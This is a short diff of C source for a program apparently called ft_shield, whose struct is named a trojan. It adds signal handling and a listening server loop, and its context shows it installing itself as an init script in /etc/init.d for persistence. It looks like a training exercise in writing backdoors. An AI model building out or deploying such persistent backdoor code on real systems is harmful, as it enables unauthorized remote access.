@@ -1,5 +1,8 @@
 #include "../include/ft_shield.h"
 
+volatile sig_atomic_t g_sigint_received = 0;
+volatile sig_atomic_t g_sigalrm_received = 0;
+
 int ft_persistence(t_troyan *shield)
 {
     shield->fd_init = fopen("/etc/init.d/ft_shield", "w");
@@ -46,6 +49,9 @@ int main()
     shield = malloc(sizeof(t_troyan));
     if (!shield)
         return (1);
+    memset(shield, 0, sizeof(t_troyan));
+    init_signal();
+
     shield->pwd = getpwuid(getuid());
     if (!shield->pwd)
     {
@@ -64,6 +70,14 @@ int main()
         free(shield);
         return (1);
     }
+
+    if (init_servsocket(shield))
+    {
+        free(shield);
+        return (1);
+    }
+    loop_server(shield);
+    close(shield->socketfd);
     free(shield);
     return (0);
 }
